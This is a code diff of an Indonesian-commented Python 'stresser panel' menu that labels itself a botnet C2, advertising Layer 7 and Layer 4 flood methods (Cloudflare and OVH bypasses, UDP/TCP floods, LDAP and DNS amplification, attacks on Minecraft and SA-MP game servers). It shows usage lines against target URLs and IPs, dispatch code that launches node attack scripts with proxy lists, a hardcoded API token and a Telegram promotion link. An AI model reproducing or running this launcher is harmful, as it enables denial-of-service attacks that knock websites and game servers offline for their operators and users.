@@ -103,23 +103,21 @@ def layer7():
     print("--------------------------------------------------")
     print("                LAYER 7 METHODS                   ")
     print("--------------------------------------------------")
-    print("➤ httpbypass    : Metode bypass HTTP umum untuk WAF/CDN (misalnya Cloudflare/Captcha)")
-    print("➤ cfgas         : Cloudflare GAS (Serangan banjir HTTP/S tingkat tinggi dengan logika bypass)")
-    print("➤ http-storm    : Metode banjir HTTP volume tinggi")
-    print("➤ tls           : Serangan Banjir TLS Handshake (menguras sumber daya TLS server)")
-    print("➤ cf-bypass     : Metode bypass Cloudflare generik")
-    print("➤ uambypass     : Bypass untuk 'Under Attack Mode' Cloudflare")
-    print("➤ cf-flood     : Metode ini menyerang target dengan memanfaatkan celah keamanan di Cloudflare untuk meningkatkan dampak serangan")
-    print("➤ httpget       : Serangan banjir permintaan HTTP GET standar")
-    print("➤ auto          : Pemilihan metode serangan otomatis berdasarkan analisis target")
-    print("➤ crash         : Upaya untuk merusak server target (misalnya, melalui permintaan yang salah format)")
-    print("➤ httpflood     : Banjir HTTP dasar (tingkat tinggi, berbagai jenis permintaan)")
-    print("➤ h2-hold     : Serangan lebih lama untuk target yang dilindungi Cloudflare")
-    print("➤ h2-bypass        : Teknik bypass Cloudflare yang lebih canggih")
-    print("➤ hyper         : Serangan dengan laju permintaan yang sangat tinggi")
-    print("➤ slow          : Serangan mirip Slowloris (mempertahankan koneksi lambat untuk menguras sumber daya server)")
-    print("➤ https-spoof   : Mencoba memalsukan permintaan HTTPS agar terlihat sah atau melewati filter")
-    print("➤ http-requests : Metode umum untuk mengirim berbagai jenis permintaan HTTP")
+    print("➤ HTTPBYPASS    : HIGHREQ BYPASS CLOUDFLARE 99% ")
+    print("➤ CFGAS          : LOWREQ HTTP1 BYPASS CLOUDFLARE 99%")
+    print("➤ HTTP-STORM    : HIGHREQ BYPASS CLOUDFLARE 95%")
+    print("➤ TLSV1           : NO PROTECT")
+    print("➤ TLSV2           : NO PROTECT")
+    print("➤ CF-BYPASS      : LOWREQ HTTP1 BYPASS CLOUDFLARE 99%")
+    print("➤ CF-FLOOD       : BYPASS CLOUDFLARE & AMAZON & AKAMAI 99%")
+    print("➤ HTTPGET        : BYPASS CLOUDFLARE 60%")
+    print("➤ CRASH          : NO PROTECT")
+    print("➤ HTTPFLOOD     : NO PROTECT")
+    print("➤ H2-UAM         : NO PROXY LOWREQ BYPASS UAM & CAPTCHA 99%")
+    print("➤ H2-HOLD        :  BYPASS CLOUDFLARE 99%")
+    print("➤ H2-BYPASS      : BYPASS CLOUDFLARE 30%")    
+    print("➤ SLOW           : NO PROTECT")
+    print("➤ HTTPS-SPOOF   : NO PROTECT KHUSUS SPOOF SSL")
     print("--------------------------------------------------")
 
 # Catatan: Pastikan fungsi `clear_screen()` dan `si()` sudah terdefinisi di bagian lain kode Anda.
@@ -130,24 +128,24 @@ def layer4():
     print("--------------------------------------------------")
     print("                LAYER 4 METHODS                   ")
     print("--------------------------------------------------")
-    print("➤ udp          : Banjir paket UDP dasar")
-    print("➤ tcp          : Banjir paket TCP (SYN, ACK, dll.)")
-    print("➤ nfo-killer   : Banjir khusus yang menargetkan server game (seringkali NFOservers)")
-    print("➤ std          : Banjir generik standar (umum untuk Layer 4)")
-    print("➤ udpbypass    : Upaya untuk melewati perlindungan banjir UDP")
-    print("➤ destroy      : Banjir intens yang bertujuan membanjiri dan merusak layanan")
-    print("➤ home         : Banjir generik untuk beban umum")
-    print("➤ god          : Metode banjir yang sangat kuat atau serbaguna")
-    print("➤ slowloris    : Serangan Slowloris (mempertahankan koneksi lambat untuk menguras sumber daya server - *Catatan: Ini adalah metode Layer 7*)")
-    print("➤ flux         : Banjir yang terkait dengan serangan DNS (mis. DNS Flux/Subdomain acak)")
-    print("➤ stdv2        : Banjir standar versi 2 (versi yang diperbarui)")
-    print("➤ ovh-raw      : Banjir paket mentah yang menargetkan server yang dilindungi OVH")
-    print("➤ ovh-beam     : Teknik banjir spesifik untuk perlindungan OVH")
-    print("➤ overflow     : Banjir yang mencoba menyebabkan *buffer overflow* atau kehabisan sumber daya")
-    print("➤ ovh-amp      : Serangan amplifikasi yang menargetkan OVH")
-    print("➤ minecraft    : Banjir khusus yang menargetkan server Minecraft")
-    print("➤ samp         : Banjir khusus yang menargetkan server San Andreas Multiplayer (SA-MP)")
-    print("➤ ldap         : Banjir Amplifikasi LDAP")
+    print("➤ UDP          : UDP FLOOD")
+    print("➤ TCP          : TCP MIX FLOOD")
+    print("➤ NFO-KILLER   : NFOSERVER ATTACK")
+    print("➤ STD          : UDP&TCPSYN&ICMP MIX")
+    print("➤ UDPBYPASS    : BYPASS UDP PROTECT")
+    print("➤ DESTROY      : UDP FLOOD")
+    print("➤ HOME         : UDP FLOOD")
+    print("➤ GOD          : UDP FLOOD")
+    print("➤ SLOWLORIS    : TCP SLOW")
+    print("➤ FLUX         : TCP SYN")
+    print("➤ STDV2        : TCP FLOOD")
+    print("➤ OVH-RAW      : TCP BYPASS OVH")
+    print("➤ OVH-BEAM     : TCP BYPASS OVH")
+    print("➤ OVERFLOW     : UDP DNS FLOOD")
+    print("➤ OVH-AMP      : UDP MIX DNS&NTP")
+    print("➤ MINECRAFT    : TCP ATTACK GAME SERVER")
+    print("➤ SAMP         : TCP&UDP MIX ATTACK GTASA MULTIPLAYER ")
+    print("➤ LDAP         : UDP AMP FLOOD")
     print("--------------------------------------------------")
 
 # Catatan: Pastikan fungsi `clear_screen()` dan `si()` sudah terdefinisi di bagian lain kode Anda.
@@ -160,43 +158,41 @@ def usage():
     print("--------------------------------------------------")
 
     print("\n--- METODE LAYER 7 ---")
-    print("➤ httpbypass    : httpbypass https://target.com 60")
-    print("➤ cfgas         : cfgas https://target.com 60")
-    print("➤ http-storm    : http-storm https://target.com 60")
-    print("➤ tls           : tls https://target.com 60")
-    print("➤ cf-bypass     : cf-bypass https://target.com 60")
-    print("➤ uambypass     : uambypass https://target.com 60")
-    print("➤ cf-flood       : cf-flood https://target.com 60")
-    print("➤ httpget       : httpget https://target.com 60")
-    print("➤ auto          : auto https://target.com 60")
-    print("➤ crash         : crash https://target.com GET")
-    print("➤ httpflood     : httpflood https://target.com 15000 get 60")
-    print("➤ h2-hold       : h2-hold https://target.com 60")
-    print("➤ h2-bypass    : h2-bypass https://target.com 60")
-    print("➤ hyper         : hyper https://target.com 60")
-    print("➤ slow          : slow https://target.com 60")
-    print("➤ https-spoof   : https-spoof https://target.com 60")
-    print("➤ http-requests : http-requests https://target.com 60")
+    print("➤ HTTPBYPASS    : HTTPBYPASS https://target.com 60")
+    print("➤ CFGAS         : CFGAS https://target.com 60")
+    print("➤ HTTP-STORM    : HTTP-STORM https://target.com 60")
+    print("➤ TLSV1           : TLSV1 https://target.com 60")
+    print("➤ TLSV2           : TLSV2 https://target.com 60")
+    print("➤ CF-BYPASS     : CF-BYPASS https://target.com 60")
+    print("➤ CF-FLOOD       : CF-FLOOD https://target.com 60")
+    print("➤ HTTPGET       : HTTPGET https://target.com 60")
+    print("➤ CRASH         : CRASH https://target.com GET")
+    print("➤ HTTPFLOOD     : HTTPFLOOD https://target.com 15000 get 60")
+    print("➤ H2-UAM        : H2-UAM https://target.com 60")
+    print("➤ H2-HOLD       : H2-HOLD https://target.com 60")
+    print("➤ H2-BYPASS    : H2-BYPASS https://target.com 60")
+    print("➤ SLOW          : SLOW https://target.com 60")
+    print("➤ HTTPS-SPOOF   : HTTPS-SPOOF https://target.com 60")
 
     print("\n--- METODE LAYER 4 ---")
-    print("➤ udp          : udp 1.1.1.1 port")
-    print("➤ tcp          : tcp GET/POST/HEAD 1.1.1.1 port 60 8500")
-    print("➤ nfo-killer   : nfo-killer 1.1.1.1 port 850 60")
-    print("➤ std          : std 1.1.1.1 port")
-    print("➤ udpbypass    : udpbypass 1.1.1.1 port")
-    print("➤ destroy      : destroy 1.1.1.1 port 60")
-    print("➤ home         : home 1.1.1.1 port 65500 60")
-    print("➤ god          : god 1.1.1.1 port 60")
-    print("➤ slowloris    : slowloris 1.1.1.1 port")
-    print("➤ flux         : flux 1.1.1.1 port 250")
-    print("➤ stdv2        : stdv2 1.1.1.1 port")
-    print("➤ ovh-raw      : ovh-raw GET 1.1.1.1 port 60 8500")
-    print("➤ ovh-beam     : ovh-beam GET 1.1.1.1 port 60")
-    print("➤ overflow     : overflow 1.1.1.1 port 5000")
-    print("➤ ovh-amp      : ovh-amp 1.1.1.1 port")
-    print("➤ minecraft    : minecraft 1.1.1.1 5000 500 60")
-    print("➤ samp         : samp 1.1.1.1 7777")
-    print("➤ ldap         : ldap 1.1.1.1 port 650 60")
+    print("➤ UDP          : UDP 1.1.1.1 port")
+    print("➤ TCP          : TCP GET/POST/HEAD 1.1.1.1 port 60 8500")
+    print("➤ NFO-KILLER   : NFO-KILLER 1.1.1.1 port 850 60")
+    print("➤ STD          : STD 1.1.1.1 port")
+    print("➤ UDPBYPASS    : UDPBYPASS 1.1.1.1 port")
+    print("➤ DESTROY      : DESTROY 1.1.1.1 port 60")
+    print("➤ HOME         : HOME 1.1.1.1 port 65500 60")
+    print("➤ GOD          : GOD 1.1.1.1 port 60")
+    print("➤ SLOWLORIS    : SLOWLORIS 1.1.1.1 port")
+    print("➤ FLUX         : FLUX 1.1.1.1 port 250")
+    print("➤ STDV2        : STDV2 1.1.1.1 port")
+    print("➤ OVH-RAW      : OVH-RAW GET 1.1.1.1 port 60 8500")
+    print("➤ OVH-BEAM     : OVH-BEAM GET 1.1.1.1 port 60")
+    print("➤ OVERFLOW     : OVERFLOW 1.1.1.1 port 5000")
+    print("➤ OVH-AMP      : OVH-AMP 1.1.1.1 port")
+    print("➤ MINECRAFT    : MINECRAFT 1.1.1.1 5000 500 60")
+    print("➤ SAMP         : SAMP 1.1.1.1 7777")
+    print("➤ LDAP         : LDAP 1.1.1.1 port 650 60")
     print("--------------------------------------------------")
 
 def clear_screen():
@@ -213,8 +209,13 @@ box_content_width = 66
 def menu():
     clear_screen()
     
-    # MENGHAPUS: Baris ini (title bar) dihapus karena sering bermasalah di terminal dasar.
-    # sys.stdout.write(f"\x1b]2;Overload Server --> Online siswa: [{bots}] | paket siswa | VIP (true)\x07")
+    # 🌟 BARIS PERBAIKAN: Title bar dihidupkan kembali
+    # Menggunakan OSC 2 (\x1b]2;) untuk mengatur judul jendela.
+    # Nilai 'bots' diasumsikan adalah variabel yang sudah didefinisikan (misalnya, bots = 5)
+    # Ganti 'bots' dengan nilai atau variabel yang sesuai.
+    bots = 5  # Contoh nilai variabel
+    sys.stdout.write(f"\x1b]2;OVERLOAD C2 --> Online Botnet: [{bots}] | User : root | VIP (true)\x07")
+    sys.stdout.flush() # Penting untuk memastikan output segera dikirim
     
     # Pesan informasi awal (Teks polos)
     header_text = ' [ https://t.me/+VP7cK9_P7jE4ZjBl ] | Welcome to Stresser Panel | Owner: @OverloadServer | Update v5.0 '
@@ -222,9 +223,8 @@ def menu():
     print("")
 
     # Seni ASCII (Logo) - HANYA Teks Polos
-    # Karakter double line (██) tetap dipertahankan selama terminal Anda mendukungnya.
-    ansi_art_lines = """  
-                                     .                                                      .
+    ansi_art_lines = """
+                                           .                                                      .
         .n                   .                 .                  n.
   .   .dP                  dP                   9b                 9b.    .
  4    qXb         .       dX                     Xb       .        dXp     t
@@ -642,6 +642,19 @@ def main():
                 print('Usage: https-spoof <url> <time> <threads>')
                 print('Example: https-spoof http://vailon.com 60 500')     
                 
+        elif "h2-uam" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]               
+                os.system(f'python3 h2-uam.py {url} {time}')
+                url = f"{url}"
+                token = "727e8c2fa5b07c"
+                result = get_url_info(url, token)
+                print(result) 
+            except IndexError:
+                print('Usage: h2-uam <url> <time>')
+                print('Example: h2-uam https://lol.com 60')                             
+        
         elif "slow" in cnc:
             try:
                url, time = cnc.split()[1:3]
@@ -667,36 +680,6 @@ def main():
             except IndexError:
                 print('Penggunaan: slow <url> <waktu>')
                 print('Contoh: slow http://example.com 60')
-            except ValueError as ve:
-                print(f"Waktu tidak valid: {ve}")
-            except Exception as e:
-                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")
-    
-        elif "hyper" in cnc:
-            try:
-               url, time = cnc.split()[1:3]
-               os.system("clear")  # Bersihkan layar (opsional)
-               
-               os.system(f'node hyper.js {url} {time}')
-                
-               url = f"{url}"
-               token = "727e8c2fa5b07c"          
-               result = get_url_info(url, token)
-               print(result) 
-                
-               sys.stdout.write(f"\x1b]2; https://t.me/+VP7cK9_P7jE4ZjBl\x07")
-               sys.stdout.flush()
-               
-               print(f"""
-               [Sistem] Informasi
-               Target: {url}
-               Waktu: {time}s
-               Metode: hyper
-               Ketik [CLS] untuk membersihkan terminal""") 
-                         
-            except IndexError:
-                print('Penggunaan: hyper <url> <waktu>')
-                print('Contoh: hyper http://example.com 60')
             except ValueError as ve:
                 print(f"Waktu tidak valid: {ve}")
             except Exception as e:
@@ -738,7 +721,6 @@ def main():
                os.system("clear")  # Bersihkan layar (opsional)
                
                os.system(f'node h2-holdv1.js {url} {time} 3 32 proxies.txt')     
-               os.system(f'node h2-holdv2.js {url} {time} 3 32 proxies.txt')     
                
                url = f"{url}"
                token = "727e8c2fa5b07c"
@@ -828,10 +810,8 @@ def main():
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                 
-               os.system(f'node httpbypass {url} {time} 3 32 proxies.txt')
-               os.system(f'node httpbypassv2 {url} {time} 3 32 proxies.txt')
-                
-               url = f"{url}"
+               os.system(f'node h2-holdv2.js {url} {time} 3 32 proxies.txt')     
+               
                token = "727e8c2fa5b07c"
                result = get_url_info(url, token)
                print(result) 
@@ -854,43 +834,12 @@ def main():
             except Exception as e:
                 print(f"Terjadi kesalahan saat menjalankan perintah: {e}") 
 
-        elif "http-requests" in cnc:
-            try:
-               url, time = cnc.split()[1:3]
-               os.system("clear")  # Bersihkan layar (opsional)
-               
-               os.system(f'node http-requests.js {url} {time}')
-               
-               url = f"{url}"
-               token = "727e8c2fa5b07c"
-               result = get_url_info(url, token)
-               print(result) 
-                
-               sys.stdout.write(f"\x1b]2; https://t.me/+VP7cK9_P7jE4ZjBl\x07")
-               sys.stdout.flush()
-               
-               print(f"""
-               [Sistem] Informasi
-               Target: {url}
-               Waktu: {time}s
-               Metode: http-requests
-               Ketik [CLS] untuk membersihkan terminal""")  
-                        
-            except IndexError:
-                print('Penggunaan: http-requests <url> <waktu>')
-                print('Contoh: http-requests http://example.com 60')
-            except ValueError as ve:
-                print(f"Waktu tidak valid: {ve}")
-            except Exception as e:
-                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")
-
-        elif "tls" in cnc:
+        elif "tlsv1" in cnc:
             try:
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                                
-               os.system(f'node tlsv2 {url} {time} 3 32 proxies.txt')
-               os.system(f'node tlsv3 {url} {time} 3 32 proxies.txt')             
+               os.system(f'node httpbypassv2.js {url} {time} 3 32 proxies.txt')        
                
                url = f"{url}"
                token = "727e8c2fa5b07c"
@@ -904,47 +853,46 @@ def main():
                [Sistem] Informasi
                Target: {url}
                Waktu: {time}s
-               Metode: tls
+               Metode: tlsv1
                Ketik [CLS] untuk membersihkan terminal""") 
                          
             except IndexError:
-                print('Penggunaan: tls <url> <waktu>')
-                print('Contoh: tls http://example.com 60')
+                print('Penggunaan: tlsv1 <url> <waktu>')
+                print('Contoh: tlsv1 http://example.com 60')
             except ValueError as ve:
                 print(f"Waktu tidak valid: {ve}")
             except Exception as e:
-                print(f"Terjadi kesalahan saat menjalankan perintah: {e}") 
-
-        elif "auto" in cnc:
+                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")
+                
+        elif "tlsv2" in cnc:
             try:
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
-                     
-               os.system(f'node auto.js {url} {time} 3 32 proxies.txt')
-               os.system(f'node autov2.js {url} {time} 3 32 proxies.txt')
-
+                               
+               os.system(f'node autov2.js {url} {time} 3 32 proxies.txt')        
+               
                url = f"{url}"
                token = "727e8c2fa5b07c"
                result = get_url_info(url, token)
                print(result) 
-
+                
+               sys.stdout.write(f"\x1b]2; https://t.me/+VP7cK9_P7jE4ZjBl\x07")
+               sys.stdout.flush()
+               
                print(f"""
                [Sistem] Informasi
                Target: {url}
                Waktu: {time}s
-               Metode: auto
-               Ketik [CLS] untuk membersihkan terminal""")
-
-               sys.stdout.write(f"\x1b]2; https://t.me/+VP7cK9_P7jE4ZjBl\x07")
-               sys.stdout.flush()
-
+               Metode: tlsv2
+               Ketik [CLS] untuk membersihkan terminal""") 
+                         
             except IndexError:
-                print('Penggunaan: auto <url> <waktu>')
-                print('Contoh: auto http://example.com 60')
+                print('Penggunaan: tlsv2 <url> <waktu>')
+                print('Contoh: tlsv2 http://example.com 60')
             except ValueError as ve:
                 print(f"Waktu tidak valid: {ve}")
             except Exception as e:
-                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")    
+                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")            
 
         elif "cf-bypass" in cnc:
             try:
@@ -971,36 +919,6 @@ def main():
             except IndexError:
                 print('Penggunaan: cf-bypass <url> <waktu>')
                 print('Contoh: cf-bypass http://example.com 60')
-            except ValueError as ve:
-                print(f"Waktu tidak valid: {ve}")
-            except Exception as e:
-                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")
-
-        elif "uambypass" in cnc:
-            try:
-               url, time = cnc.split()[1:3]
-               os.system("clear")  # Bersihkan layar (opsional)
-               
-               os.system(f'node uambypass.js {url} {time} 32 proxies.txt')
-                
-               url = f"{url}"
-               token = "727e8c2fa5b07c"
-               result = get_url_info(url, token)
-               print(result) 
-                
-               sys.stdout.write(f"\x1b]2; https://t.me/+VP7cK9_P7jE4ZjBl\x07")
-               sys.stdout.flush()
-               
-               print(f"""
-               [Sistem] Informasi
-               Target: {url}
-               Waktu: {time}s
-               Metode: uambypass
-               Ketik [CLS] untuk membersihkan terminal""") 
-                         
-            except IndexError:
-                print('Penggunaan: uambypass <url> <waktu>')
-                print('Contoh: uambypass http://example.com 60')
             except ValueError as ve:
                 print(f"Waktu tidak valid: {ve}")
             except Exception as e:
